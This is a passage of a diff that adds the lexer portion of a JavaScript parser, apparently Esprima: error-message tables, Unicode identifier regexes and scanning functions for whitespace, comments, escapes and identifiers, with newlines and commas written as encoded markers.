ClassPropertyType = {<\n>+        'static': 'static'<c><\n>+        prototype: 'prototype'<\n>+    };<\n>+    // Error messages should be identical to V8.<\n>+    Messages = {<\n>+        UnexpectedToken:  'Unexpected token %0'<c><\n>+        UnexpectedNumber:  'Unexpected number'<c><\n>+        UnexpectedString:  'Unexpected string'<c><\n>+        UnexpectedIdentifier:  'Unexpected identifier'<c><\n>+        UnexpectedReserved:  'Unexpected reserved word'<c><\n>+        UnexpectedTemplate:  'Unexpected quasi %0'<c><\n>+        UnexpectedEOS:  'Unexpected end of input'<c><\n>+        NewlineAfterThrow:  'Illegal newline after throw'<c><\n>+        InvalidRegExp: 'Invalid regular expression'<c><\n>+        UnterminatedRegExp:  'Invalid regular expression: missing /'<c><\n>+        InvalidLHSInAssignment:  'Invalid left-hand side in assignment'<c><\n>+        InvalidLHSInFormalsList:  'Invalid left-hand side in formals list'<c><\n>+        InvalidLHSInForIn:  'Invalid left-hand side in for-in'<c><\n>+        MultipleDefaultsInSwitch: 'More than one default clause in switch statement'<c><\n>+        NoCatchOrFinally:  'Missing catch or finally after try'<c><\n>+        UnknownLabel: 'Undefined label \'%0\''<c><\n>+        Redeclaration: '%0 \'%1\' has already been declared'<c><\n>+        IllegalContinue: 'Illegal continue statement'<c><\n>+        IllegalBreak: 'Illegal break statement'<c><\n>+        IllegalDuplicateClassProperty: 'Illegal duplicate property in class definition'<c><\n>+        IllegalReturn: 'Illegal return statement'<c><\n>+        IllegalYield: 'Illegal yield expression'<c><\n>+        IllegalSpread: 'Illegal spread element'<c><\n>+        StrictModeWith:  'Strict mode code may not include a with statement'<c><\n>+        StrictCatchVariable:  'Catch variable may not be eval or arguments in strict mode'<c><\n>+        StrictVarName:  'Variable name may not be eval or arguments in strict mode'<c><\n>+        StrictParamName:  'Parameter name eval or arguments is not allowed in strict mode'<c><\n>+        StrictParamDupe: 'Strict mode function may not have duplicate parameter names'<c><\n>+        ParameterAfterRestParameter: 'Rest parameter must be final parameter of an argument list'<c><\n>+        DefaultRestParameter: 'Rest parameter can not have a default value'<c><\n>+        ElementAfterSpreadElement: 'Spread must be the final element of an element list'<c><\n>+        ObjectPatternAsRestParameter: 'Invalid rest parameter'<c><\n>+        ObjectPatternAsSpread: 'Invalid spread argument'<c><\n>+        StrictFunctionName:  'Function name may not be eval or arguments in strict mode'<c><\n>+        StrictOctalLiteral:  'Octal literals are not allowed in strict mode.'<c><\n>+        StrictDelete:  'Delete of an unqualified identifier in strict mode.'<c><\n>+        StrictDuplicateProperty:  'Duplicate data property in object literal not allowed in strict mode'<c><\n>+        AccessorDataProperty:  'Object literal may not have data and accessor property with the same name'<c><\n>+        AccessorGetSet:  'Object literal may not have multiple get/set accessors with the same name'<c><\n>+        StrictLHSAssignment:  'Assignment to eval or arguments is not allowed in strict mode'<c><\n>+        StrictLHSPostfix:  'Postfix increment/decrement may not have eval or arguments operand in strict mode'<c><\n>+        StrictLHSPrefix:  'Prefix increment/decrement may not have eval or arguments operand in strict mode'<c><\n>+        StrictReservedWord:  'Use of future reserved word in strict mode'<c><\n>+        MissingFromClause: 'Missing from clause'<c><\n>+        NoAsAfterImportNamespace: 'Missing as after import *'<c><\n>+        InvalidModuleSpecifier: 'Invalid module specifier'<c><\n>+        NoUnintializedConst: 'Const must be initialized'<c><\n>+        ComprehensionRequiresBlock: 'Comprehension must have at least one block'<c><\n>+        ComprehensionError:  'Comprehension Error'<c><\n>+        EachNotAllowed:  'Each is not supported'<\n>+    };<\n>+    // See also tools/generate-unicode-regex.py.<\n>+    Regex = {<\n>+        NonAsciiIdentifierStart: new RegExp('[\xaa\xb5\xba\xc0-\xd6\xd8-\xf6\xf8-\u02c1\u02c6-\u02d1\u02e0-\u02e4\u02ec\u02ee\u0370-\u0374\u0376\u0377\u037a-\u037d\u0386\u0388-\u038a\u038c\u038e-\u03a1\u03a3-\u03f5\u03f7-\u0481\u048a-\u0527\u0531-\u0556\u0559\u0561-\u0587\u05d0-\u05ea\u05f0-\u05f2\u0620-\u064a\u066e\u066f\u0671-\u06d3\u06d5\u06e5\u06e6\u06ee\u06ef\u06fa-\u06fc\u06ff\u0710\u0712-\u072f\u074d-\u07a5\u07b1\u07ca-\u07ea\u07f4\u07f5\u07fa\u0800-\u0815\u081a\u0824\u0828\u0840-\u0858\u08a0\u08a2-\u08ac\u0904-\u0939\u093d\u0950\u0958-\u0961\u0971-\u0977\u0979-\u097f\u0985-\u098c\u098f\u0990\u0993-\u09a8\u09aa-\u09b0\u09b2\u09b6-\u09b9\u09bd\u09ce\u09dc\u09dd\u09df-\u09e1\u09f0\u09f1\u0a05-\u0a0a\u0a0f\u0a10\u0a13-\u0a28\u0a2a-\u0a30\u0a32\u0a33\u0a35\u0a36\u0a38\u0a39\u0a59-\u0a5c\u0a5e\u0a72-\u0a74\u0a85-\u0a8d\u0a8f-\u0a91\u0a93-\u0aa8\u0aaa-\u0ab0\u0ab2\u0ab3\u0ab5-\u0ab9\u0abd\u0ad0\u0ae0\u0ae1\u0b05-\u0b0c\u0b0f\u0b10\u0b13-\u0b28\u0b2a-\u0b30\u0b32\u0b33\u0b35-\u0b39\u0b3d\u0b5c\u0b5d\u0b5f-\u0b61\u0b71\u0b83\u0b85-\u0b8a\u0b8e-\u0b90\u0b92-\u0b95\u0b99\u0b9a\u0b9c\u0b9e\u0b9f\u0ba3\u0ba4\u0ba8-\u0baa\u0bae-\u0bb9\u0bd0\u0c05-\u0c0c\u0c0e-\u0c10\u0c12-\u0c28\u0c2a-\u0c33\u0c35-\u0c39\u0c3d\u0c58\u0c59\u0c60\u0c61\u0c85-\u0c8c\u0c8e-\u0c90\u0c92-\u0ca8\u0caa-\u0cb3\u0cb5-\u0cb9\u0cbd\u0cde\u0ce0\u0ce1\u0cf1\u0cf2\u0d05-\u0d0c\u0d0e-\u0d10\u0d12-\u0d3a\u0d3d\u0d4e\u0d60\u0d61\u0d7a-\u0d7f\u0d85-\u0d96\u0d9a-\u0db1\u0db3-\u0dbb\u0dbd\u0dc0-\u0dc6\u0e01-\u0e30\u0e32\u0e33\u0e40-\u0e46\u0e81\u0e82\u0e84\u0e87\u0e88\u0e8a\u0e8d\u0e94-\u0e97\u0e99-\u0e9f\u0ea1-\u0ea3\u0ea5\u0ea7\u0eaa\u0eab\u0ead-\u0eb0\u0eb2\u0eb3\u0ebd\u0ec0-\u0ec4\u0ec6\u0edc-\u0edf\u0f00\u0f40-\u0f47\u0f49-\u0f6c\u0f88-\u0f8c\u1000-\u102a\u103f\u1050-\u1055\u105a-\u105d\u1061\u1065\u1066\u106e-\u1070\u1075-\u1081\u108e\u10a0-\u10c5\u10c7\u10cd\u10d0-\u10fa\u10fc-\u1248\u124a-\u124d\u1250-\u1256\u1258\u125a-\u125d\u1260-\u1288\u128a-\u128d\u1290-\u12b0\u12b2-\u12b5\u12b8-\u12be\u12c0\u12c2-\u12c5\u12c8-\u12d6\u12d8-\u1310\u1312-\u1315\u1318-\u135a\u1380-\u138f\u13a0-\u13f4\u1401-\u166c\u166f-\u167f\u1681-\u169a\u16a0-\u16ea\u16ee-\u16f0\u1700-\u170c\u170e-\u1711\u1720-\u1731\u1740-\u1751\u1760-\u176c\u176e-\u1770\u1780-\u17b3\u17d7\u17dc\u1820-\u1877\u1880-\u18a8\u18aa\u18b0-\u18f5\u1900-\u191c\u1950-\u196d\u1970-\u1974\u1980-\u19ab\u19c1-\u19c7\u1a00-\u1a16\u1a20-\u1a54\u1aa7\u1b05-\u1b33\u1b45-\u1b4b\u1b83-\u1ba0\u1bae\u1baf\u1bba-\u1be5\u1c00-\u1c23\u1c4d-\u1c4f\u1c5a-\u1c7d\u1ce9-\u1cec\u1cee-\u1cf1\u1cf5\u1cf6\u1d00-\u1dbf\u1e00-\u1f15\u1f18-\u1f1d\u1f20-\u1f45\u1f48-\u1f4d\u1f50-\u1f57\u1f59\u1f5b\u1f5d\u1f5f-\u1f7d\u1f80-\u1fb4\u1fb6-\u1fbc\u1fbe\u1fc2-\u1fc4\u1fc6-\u1fcc\u1fd0-\u1fd3\u1fd6-\u1fdb\u1fe0-\u1fec\u1ff2-\u1ff4\u1ff6-\u1ffc\u2071\u207f\u2090-\u209c\u2102\u2107\u210a-\u2113\u2115\u2119-\u211d\u2124\u2126\u2128\u212a-\u212d\u212f-\u2139\u213c-\u213f\u2145-\u2149\u214e\u2160-\u2188\u2c00-\u2c2e\u2c30-\u2c5e\u2c60-\u2ce4\u2ceb-\u2cee\u2cf2\u2cf3\u2d00-\u2d25\u2d27\u2d2d\u2d30-\u2d67\u2d6f\u2d80-\u2d96\u2da0-\u2da6\u2da8-\u2dae\u2db0-\u2db6\u2db8-\u2dbe\u2dc0-\u2dc6\u2dc8-\u2dce\u2dd0-\u2dd6\u2dd8-\u2dde\u2e2f\u3005-\u3007\u3021-\u3029\u3031-\u3035\u3038-\u303c\u3041-\u3096\u309d-\u309f\u30a1-\u30fa\u30fc-\u30ff\u3105-\u312d\u3131-\u318e\u31a0-\u31ba\u31f0-\u31ff\u3400-\u4db5\u4e00-\u9fcc\ua000-\ua48c\ua4d0-\ua4fd\ua500-\ua60c\ua610-\ua61f\ua62a\ua62b\ua640-\ua66e\ua67f-\ua697\ua6a0-\ua6ef\ua717-\ua71f\ua722-\ua788\ua78b-\ua78e\ua790-\ua793\ua7a0-\ua7aa\ua7f8-\ua801\ua803-\ua805\ua807-\ua80a\ua80c-\ua822\ua840-\ua873\ua882-\ua8b3\ua8f2-\ua8f7\ua8fb\ua90a-\ua925\ua930-\ua946\ua960-\ua97c\ua984-\ua9b2\ua9cf\uaa00-\uaa28\uaa40-\uaa42\uaa44-\uaa4b\uaa60-\uaa76\uaa7a\uaa80-\uaaaf\uaab1\uaab5\uaab6\uaab9-\uaabd\uaac0\uaac2\uaadb-\uaadd\uaae0-\uaaea\uaaf2-\uaaf4\uab01-\uab06\uab09-\uab0e\uab11-\uab16\uab20-\uab26\uab28-\uab2e\uabc0-\uabe2\uac00-\ud7a3\ud7b0-\ud7c6\ud7cb-\ud7fb\uf900-\ufa6d\ufa70-\ufad9\ufb00-\ufb06\ufb13-\ufb17\ufb1d\ufb1f-\ufb28\ufb2a-\ufb36\ufb38-\ufb3c\ufb3e\ufb40\ufb41\ufb43\ufb44\ufb46-\ufbb1\ufbd3-\ufd3d\ufd50-\ufd8f\ufd92-\ufdc7\ufdf0-\ufdfb\ufe70-\ufe74\ufe76-\ufefc\uff21-\uff3a\uff41-\uff5a\uff66-\uffbe\uffc2-\uffc7\uffca-\uffcf\uffd2-\uffd7\uffda-\uffdc]')<c><\n>+        NonAsciiIdentifierPart: new RegExp('[\xaa\xb5\xba\xc0-\xd6\xd8-\xf6\xf8-\u02c1\u02c6-\u02d1\u02e0-\u02e4\u02ec\u02ee\u0300-\u0374\u0376\u0377\u037a-\u037d\u0386\u0388-\u038a\u038c\u038e-\u03a1\u03a3-\u03f5\u03f7-\u0481\u0483-\u0487\u048a-\u0527\u0531-\u0556\u0559\u0561-\u0587\u0591-\u05bd\u05bf\u05c1\u05c2\u05c4\u05c5\u05c7\u05d0-\u05ea\u05f0-\u05f2\u0610-\u061a\u0620-\u0669\u066e-\u06d3\u06d5-\u06dc\u06df-\u06e8\u06ea-\u06fc\u06ff\u0710-\u074a\u074d-\u07b1\u07c0-\u07f5\u07fa\u0800-\u082d\u0840-\u085b\u08a0\u08a2-\u08ac\u08e4-\u08fe\u0900-\u0963\u0966-\u096f\u0971-\u0977\u0979-\u097f\u0981-\u0983\u0985-\u098c\u098f\u0990\u0993-\u09a8\u09aa-\u09b0\u09b2\u09b6-\u09b9\u09bc-\u09c4\u09c7\u09c8\u09cb-\u09ce\u09d7\u09dc\u09dd\u09df-\u09e3\u09e6-\u09f1\u0a01-\u0a03\u0a05-\u0a0a\u0a0f\u0a10\u0a13-\u0a28\u0a2a-\u0a30\u0a32\u0a33\u0a35\u0a36\u0a38\u0a39\u0a3c\u0a3e-\u0a42\u0a47\u0a48\u0a4b-\u0a4d\u0a51\u0a59-\u0a5c\u0a5e\u0a66-\u0a75\u0a81-\u0a83\u0a85-\u0a8d\u0a8f-\u0a91\u0a93-\u0aa8\u0aaa-\u0ab0\u0ab2\u0ab3\u0ab5-\u0ab9\u0abc-\u0ac5\u0ac7-\u0ac9\u0acb-\u0acd\u0ad0\u0ae0-\u0ae3\u0ae6-\u0aef\u0b01-\u0b03\u0b05-\u0b0c\u0b0f\u0b10\u0b13-\u0b28\u0b2a-\u0b30\u0b32\u0b33\u0b35-\u0b39\u0b3c-\u0b44\u0b47\u0b48\u0b4b-\u0b4d\u0b56\u0b57\u0b5c\u0b5d\u0b5f-\u0b63\u0b66-\u0b6f\u0b71\u0b82\u0b83\u0b85-\u0b8a\u0b8e-\u0b90\u0b92-\u0b95\u0b99\u0b9a\u0b9c\u0b9e\u0b9f\u0ba3\u0ba4\u0ba8-\u0baa\u0bae-\u0bb9\u0bbe-\u0bc2\u0bc6-\u0bc8\u0bca-\u0bcd\u0bd0\u0bd7\u0be6-\u0bef\u0c01-\u0c03\u0c05-\u0c0c\u0c0e-\u0c10\u0c12-\u0c28\u0c2a-\u0c33\u0c35-\u0c39\u0c3d-\u0c44\u0c46-\u0c48\u0c4a-\u0c4d\u0c55\u0c56\u0c58\u0c59\u0c60-\u0c63\u0c66-\u0c6f\u0c82\u0c83\u0c85-\u0c8c\u0c8e-\u0c90\u0c92-\u0ca8\u0caa-\u0cb3\u0cb5-\u0cb9\u0cbc-\u0cc4\u0cc6-\u0cc8\u0cca-\u0ccd\u0cd5\u0cd6\u0cde\u0ce0-\u0ce3\u0ce6-\u0cef\u0cf1\u0cf2\u0d02\u0d03\u0d05-\u0d0c\u0d0e-\u0d10\u0d12-\u0d3a\u0d3d-\u0d44\u0d46-\u0d48\u0d4a-\u0d4e\u0d57\u0d60-\u0d63\u0d66-\u0d6f\u0d7a-\u0d7f\u0d82\u0d83\u0d85-\u0d96\u0d9a-\u0db1\u0db3-\u0dbb\u0dbd\u0dc0-\u0dc6\u0dca\u0dcf-\u0dd4\u0dd6\u0dd8-\u0ddf\u0df2\u0df3\u0e01-\u0e3a\u0e40-\u0e4e\u0e50-\u0e59\u0e81\u0e82\u0e84\u0e87\u0e88\u0e8a\u0e8d\u0e94-\u0e97\u0e99-\u0e9f\u0ea1-\u0ea3\u0ea5\u0ea7\u0eaa\u0eab\u0ead-\u0eb9\u0ebb-\u0ebd\u0ec0-\u0ec4\u0ec6\u0ec8-\u0ecd\u0ed0-\u0ed9\u0edc-\u0edf\u0f00\u0f18\u0f19\u0f20-\u0f29\u0f35\u0f37\u0f39\u0f3e-\u0f47\u0f49-\u0f6c\u0f71-\u0f84\u0f86-\u0f97\u0f99-\u0fbc\u0fc6\u1000-\u1049\u1050-\u109d\u10a0-\u10c5\u10c7\u10cd\u10d0-\u10fa\u10fc-\u1248\u124a-\u124d\u1250-\u1256\u1258\u125a-\u125d\u1260-\u1288\u128a-\u128d\u1290-\u12b0\u12b2-\u12b5\u12b8-\u12be\u12c0\u12c2-\u12c5\u12c8-\u12d6\u12d8-\u1310\u1312-\u1315\u1318-\u135a\u135d-\u135f\u1380-\u138f\u13a0-\u13f4\u1401-\u166c\u166f-\u167f\u1681-\u169a\u16a0-\u16ea\u16ee-\u16f0\u1700-\u170c\u170e-\u1714\u1720-\u1734\u1740-\u1753\u1760-\u176c\u176e-\u1770\u1772\u1773\u1780-\u17d3\u17d7\u17dc\u17dd\u17e0-\u17e9\u180b-\u180d\u1810-\u1819\u1820-\u1877\u1880-\u18aa\u18b0-\u18f5\u1900-\u191c\u1920-\u192b\u1930-\u193b\u1946-\u196d\u1970-\u1974\u1980-\u19ab\u19b0-\u19c9\u19d0-\u19d9\u1a00-\u1a1b\u1a20-\u1a5e\u1a60-\u1a7c\u1a7f-\u1a89\u1a90-\u1a99\u1aa7\u1b00-\u1b4b\u1b50-\u1b59\u1b6b-\u1b73\u1b80-\u1bf3\u1c00-\u1c37\u1c40-\u1c49\u1c4d-\u1c7d\u1cd0-\u1cd2\u1cd4-\u1cf6\u1d00-\u1de6\u1dfc-\u1f15\u1f18-\u1f1d\u1f20-\u1f45\u1f48-\u1f4d\u1f50-\u1f57\u1f59\u1f5b\u1f5d\u1f5f-\u1f7d\u1f80-\u1fb4\u1fb6-\u1fbc\u1fbe\u1fc2-\u1fc4\u1fc6-\u1fcc\u1fd0-\u1fd3\u1fd6-\u1fdb\u1fe0-\u1fec\u1ff2-\u1ff4\u1ff6-\u1ffc\u200c\u200d\u203f\u2040\u2054\u2071\u207f\u2090-\u209c\u20d0-\u20dc\u20e1\u20e5-\u20f0\u2102\u2107\u210a-\u2113\u2115\u2119-\u211d\u2124\u2126\u2128\u212a-\u212d\u212f-\u2139\u213c-\u213f\u2145-\u2149\u214e\u2160-\u2188\u2c00-\u2c2e\u2c30-\u2c5e\u2c60-\u2ce4\u2ceb-\u2cf3\u2d00-\u2d25\u2d27\u2d2d\u2d30-\u2d67\u2d6f\u2d7f-\u2d96\u2da0-\u2da6\u2da8-\u2dae\u2db0-\u2db6\u2db8-\u2dbe\u2dc0-\u2dc6\u2dc8-\u2dce\u2dd0-\u2dd6\u2dd8-\u2dde\u2de0-\u2dff\u2e2f\u3005-\u3007\u3021-\u302f\u3031-\u3035\u3038-\u303c\u3041-\u3096\u3099\u309a\u309d-\u309f\u30a1-\u30fa\u30fc-\u30ff\u3105-\u312d\u3131-\u318e\u31a0-\u31ba\u31f0-\u31ff\u3400-\u4db5\u4e00-\u9fcc\ua000-\ua48c\ua4d0-\ua4fd\ua500-\ua60c\ua610-\ua62b\ua640-\ua66f\ua674-\ua67d\ua67f-\ua697\ua69f-\ua6f1\ua717-\ua71f\ua722-\ua788\ua78b-\ua78e\ua790-\ua793\ua7a0-\ua7aa\ua7f8-\ua827\ua840-\ua873\ua880-\ua8c4\ua8d0-\ua8d9\ua8e0-\ua8f7\ua8fb\ua900-\ua92d\ua930-\ua953\ua960-\ua97c\ua980-\ua9c0\ua9cf-\ua9d9\uaa00-\uaa36\uaa40-\uaa4d\uaa50-\uaa59\uaa60-\uaa76\uaa7a\uaa7b\uaa80-\uaac2\uaadb-\uaadd\uaae0-\uaaef\uaaf2-\uaaf6\uab01-\uab06\uab09-\uab0e\uab11-\uab16\uab20-\uab26\uab28-\uab2e\uabc0-\uabea\uabec\uabed\uabf0-\uabf9\uac00-\ud7a3\ud7b0-\ud7c6\ud7cb-\ud7fb\uf900-\ufa6d\ufa70-\ufad9\ufb00-\ufb06\ufb13-\ufb17\ufb1d-\ufb28\ufb2a-\ufb36\ufb38-\ufb3c\ufb3e\ufb40\ufb41\ufb43\ufb44\ufb46-\ufbb1\ufbd3-\ufd3d\ufd50-\ufd8f\ufd92-\ufdc7\ufdf0-\ufdfb\ufe00-\ufe0f\ufe20-\ufe26\ufe33\ufe34\ufe4d-\ufe4f\ufe70-\ufe74\ufe76-\ufefc\uff10-\uff19\uff21-\uff3a\uff3f\uff41-\uff5a\uff66-\uffbe\uffc2-\uffc7\uffca-\uffcf\uffd2-\uffd7\uffda-\uffdc]')<\n>+    };<\n>+    // Ensure the condition is true<c> otherwise throw an error.<\n>+    // This is only to have a better contract semantic<c> i.e. another safety net<\n>+    // to catch a logic error. The condition shall be fulfilled in normal case.<\n>+    // Do NOT use this to enforce a certain condition on any user input.<\n>+    function assert(condition<c> message) {<\n>+        /* istanbul ignore if */<\n>+        if (!condition) {<\n>+            throw new Error('ASSERT: ' + message);<\n>+        }<\n>+    }<\n>+    function StringMap() {<\n>+        this.$data = {};<\n>+    }<\n>+    StringMap.prototype.get = function (key) {<\n>+        key = '$' + key;<\n>+        return this.$data[key];<\n>+    };<\n>+    StringMap.prototype.set = function (key<c> value) {<\n>+        key = '$' + key;<\n>+        this.$data[key] = value;<\n>+        return this;<\n>+    };<\n>+    StringMap.prototype.has = function (key) {<\n>+        key = '$' + key;<\n>+        return Object.prototype.hasOwnProperty.call(this.$data<c> key);<\n>+    };<\n>+    StringMap.prototype['delete'] = function (key) {<\n>+        key = '$' + key;<\n>+        return delete this.$data[key];<\n>+    };<\n>+    function isDecimalDigit(ch) {<\n>+        return (ch >= 48 && ch <= 57);   // 0..9<\n>+    }<\n>+    function isHexDigit(ch) {<\n>+        return '0123456789abcdefABCDEF'.indexOf(ch) >= 0;<\n>+    }<\n>+    function isOctalDigit(ch) {<\n>+        return '01234567'.indexOf(ch) >= 0;<\n>+    }<\n>+    // 7.2 White Space<\n>+    function isWhiteSpace(ch) {<\n>+        return (ch === 32) ||  // space<\n>+            (ch === 9) ||      // tab<\n>+            (ch === 0xB) ||<\n>+            (ch === 0xC) ||<\n>+            (ch === 0xA0) ||<\n>+            (ch >= 0x1680 && '\u1680\u180E\u2000\u2001\u2002\u2003\u2004\u2005\u2006\u2007\u2008\u2009\u200A\u202F\u205F\u3000\uFEFF'.indexOf(String.fromCharCode(ch)) > 0);<\n>+    }<\n>+    // 7.3 Line Terminators<\n>+    function isLineTerminator(ch) {<\n>+        return (ch === 10) || (ch === 13) || (ch === 0x2028) || (ch === 0x2029);<\n>+    }<\n>+    // 7.6 Identifier Names and Identifiers<\n>+    function isIdentifierStart(ch) {<\n>+        return (ch === 36) || (ch === 95) ||  // $ (dollar) and _ (underscore)<\n>+            (ch >= 65 && ch <= 90) ||         // A..Z<\n>+            (ch >= 97 && ch <= 122) ||        // a..z<\n>+            (ch === 92) ||                    // \ (backslash)<\n>+            ((ch >= 0x80) && Regex.NonAsciiIdentifierStart.test(String.fromCharCode(ch)));<\n>+    }<\n>+    function isIdentifierPart(ch) {<\n>+        return (ch === 36) || (ch === 95) ||  // $ (dollar) and _ (underscore)<\n>+            (ch >= 65 && ch <= 90) ||         // A..Z<\n>+            (ch >= 97 && ch <= 122) ||        // a..z<\n>+            (ch >= 48 && ch <= 57) ||         // 0..9<\n>+            (ch === 92) ||                    // \ (backslash)<\n>+            ((ch >= 0x80) && Regex.NonAsciiIdentifierPart.test(String.fromCharCode(ch)));<\n>+    }<\n>+    // 7.6.1.2 Future Reserved Words<\n>+    function isFutureReservedWord(id) {<\n>+        switch (id) {<\n>+        case 'class':<\n>+        case 'enum':<\n>+        case 'export':<\n>+        case 'extends':<\n>+        case 'import':<\n>+        case 'super':<\n>+            return true;<\n>+        default:<\n>+            return false;<\n>+        }<\n>+    }<\n>+    function isStrictModeReservedWord(id) {<\n>+        switch (id) {<\n>+        case 'implements':<\n>+        case 'interface':<\n>+        case 'package':<\n>+        case 'private':<\n>+        case 'protected':<\n>+        case 'public':<\n>+        case 'static':<\n>+        case 'yield':<\n>+        case 'let':<\n>+            return true;<\n>+        default:<\n>+            return false;<\n>+        }<\n>+    }<\n>+    function isRestrictedWord(id) {<\n>+        return id === 'eval' || id === 'arguments';<\n>+    }<\n>+    // 7.6.1.1 Keywords<\n>+    function isKeyword(id) {<\n>+        if (strict && isStrictModeReservedWord(id)) {<\n>+            return true;<\n>+        }<\n>+        // 'const' is specialized as Keyword in V8.<\n>+        // 'yield' is only treated as a keyword in strict mode.<\n>+        // 'let' is for compatiblity with SpiderMonkey and ES.next.<\n>+        // Some others are from future reserved words.<\n>+        switch (id.length) {<\n>+        case 2:<\n>+            return (id === 'if') || (id === 'in') || (id === 'do');<\n>+        case 3:<\n>+            return (id === 'var') || (id === 'for') || (id === 'new') ||<\n>+                (id === 'try') || (id === 'let');<\n>+        case 4:<\n>+            return (id === 'this') || (id === 'else') || (id === 'case') ||<\n>+                (id === 'void') || (id === 'with') || (id === 'enum');<\n>+        case 5:<\n>+            return (id === 'while') || (id === 'break') || (id === 'catch') ||<\n>+                (id === 'throw') || (id === 'const') ||<\n>+                (id === 'class') || (id === 'super');<\n>+        case 6:<\n>+            return (id === 'return') || (id === 'typeof') || (id === 'delete') ||<\n>+                (id === 'switch') || (id === 'export') || (id === 'import');<\n>+        case 7:<\n>+            return (id === 'default') || (id === 'finally') || (id === 'extends');<\n>+        case 8:<\n>+            return (id === 'function') || (id === 'continue') || (id === 'debugger');<\n>+        case 10:<\n>+            return (id === 'instanceof');<\n>+        default:<\n>+            return false;<\n>+        }<\n>+    }<\n>+    // 7.4 Comments<\n>+    function skipComment() {<\n>+        var ch<c> blockComment<c> lineComment;<\n>+        blockComment = false;<\n>+        lineComment = false;<\n>+        while (index < length) {<\n>+            ch = source.charCodeAt(index);<\n>+            if (lineComment) {<\n>+                ++index;<\n>+                if (isLineTerminator(ch)) {<\n>+                    lineComment = false;<\n>+                    if (ch === 13 && source.charCodeAt(index) === 10) {<\n>+                        ++index;<\n>+                    }<\n>+                    ++lineNumber;<\n>+                    lineStart = index;<\n>+                }<\n>+            } else if (blockComment) {<\n>+                if (isLineTerminator(ch)) {<\n>+                    if (ch === 13 && source.charCodeAt(index + 1) === 10) {<\n>+                        ++index;<\n>+                    }<\n>+                    ++lineNumber;<\n>+                    ++index;<\n>+                    lineStart = index;<\n>+                    if (index >= length) {<\n>+                        throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>+                    }<\n>+                } else {<\n>+                    ch = source.charCodeAt(index++);<\n>+                    if (index >= length) {<\n>+                        throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>+                    }<\n>+                    // Block comment ends with '*/' (char #42<c> char #47).<\n>+                    if (ch === 42) {<\n>+                        ch = source.charCodeAt(index);<\n>+                        if (ch === 47) {<\n>+                            ++index;<\n>+                            blockComment = false;<\n>+                        }<\n>+                    }<\n>+                }<\n>+            } else if (ch === 47) {<\n>+                ch = source.charCodeAt(index + 1);<\n>+                // Line comment starts with '//' (char #47<c> char #47).<\n>+                if (ch === 47) {<\n>+                    index += 2;<\n>+                    lineComment = true;<\n>+                } else if (ch === 42) {<\n>+                    // Block comment starts with '/*' (char #47<c> char #42).<\n>+                    index += 2;<\n>+                    blockComment = true;<\n>+                    if (index >= length) {<\n>+                        throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>+                    }<\n>+                } else {<\n>+                    break;<\n>+                }<\n>+            } else if (isWhiteSpace(ch)) {<\n>+                ++index;<\n>+            } else if (isLineTerminator(ch)) {<\n>+                ++index;<\n>+                if (ch === 13 && source.charCodeAt(index) === 10) {<\n>+                    ++index;<\n>+                }<\n>+                ++lineNumber;<\n>+                lineStart = index;<\n>+            } else {<\n>+                break;<\n>+            }<\n>+        }<\n>+    }<\n>+    function scanHexEscape(prefix) {<\n>+        var i<c> len<c> ch<c> code = 0;<\n>+        len = (prefix === 'u') ? 4 : 2;<\n>+        for (i = 0; i < len; ++i) {<\n>+            if (index < length && isHexDigit(source[index])) {<\n>+                ch = source[index++];<\n>+                code = code * 16 + '0123456789abcdef'.indexOf(ch.toLowerCase());<\n>+            } else {<\n>+                return '';<\n>+            }<\n>+        }<\n>+        return String.fromCharCode(code);<\n>+    }<\n>+    function scanUnicodeCodePointEscape() {<\n>+        var ch<c> code<c> cu1<c> cu2;<\n>+        ch = source[index];<\n>+        code = 0;<\n>+        // At least<c> one hex digit is required.<\n>+        if (ch === '}') {<\n>+            throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>+        }<\n>+        while (index < length) {<\n>+            ch = source[index++];<\n>+            if (!isHexDigit(ch)) {<\n>+                break;<\n>+            }<\n>+            code = code * 16 + '0123456789abcdef'.indexOf(ch.toLowerCase());<\n>+        }<\n>+        if (code > 0x10FFFF || ch !== '}') {<\n>+            throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>+        }<\n>+        // UTF-16 Encoding<\n>+        if (code <= 0xFFFF) {<\n>+            return String.fromCharCode(code);<\n>+        }<\n>+        cu1 = ((code - 0x10000) >> 10) + 0xD800;<\n>+        cu2 = ((code - 0x10000) & 1023) + 0xDC00;<\n>+        return String.fromCharCode(cu1<c> cu2);<\n>+    }<\n>+    function getEscapedIdentifier() {<\n>+        var ch<c> id;<\n>+        ch = source.charCodeAt(index++);<\n>+        id = String.fromCharCode(ch);<\n>+        // '\u' (char #92<c> char #117) denotes an escaped character.<\n>+        if (ch === 92) {<\n>+            if (source.charCodeAt(index) !== 117) {<\n>+                throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>+            }<\n>+            ++index;<\n>+            ch = scanHexEscape('u');<\n>+            if (!ch || ch === '\\' || !isIdentifierStart(ch.charCodeAt(0))) {<\n>+                throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>+            }<\n>+            id = ch;<\n>+        }<\n>+        while (index < length) {<\n>+            ch = source.charCodeAt(index);<\n>+            if (!isIdentifierPart(ch)) {<\n>+                break;<\n>+            }<\n>+            ++index;<\n>+            id += String.fromCharCode(ch);<\n>+            // '\u' (char #92<c> char #117) denotes an escaped character.<\n>+            if (ch === 92) {<\n>+                id = id.substr(0<c> id.length - 1);<\n>+                if (source.charCodeAt(index) !== 117) {<\n>+                    throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>+                }<\n>+                ++index;<\n>+                ch = scanHexEscape('u');<\n>+                if (!ch || ch === '\\' || !isIdentifierPart(ch.charCodeAt(0))) {<\n>+                    throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>+                }<\n>+                id += ch;<\n>+            }<\n>+        }<\n>+        return id;<\n>+    }<\n>+    function getIdentifier() {<\n>+        var start<c> ch;<\n>+        start = index++;<\n>+        while (index < length) {<\n>+            ch = source.charCodeAt(index);<\n>+            if (ch === 92) {<\n>+                // Blackslash (char #92) marks Unicode escape sequence.<\n>+                index = start;<\n>+                return getEscapedIdentifier();<\n>+            }<\n>+            if (isIdentifierPart(ch)) {<\n>+                ++index;<\n>+            } else {<\n>+                break;<\n>+            }<\n>+        }<\n>+        return source.slice(start<c> index);<\n>+    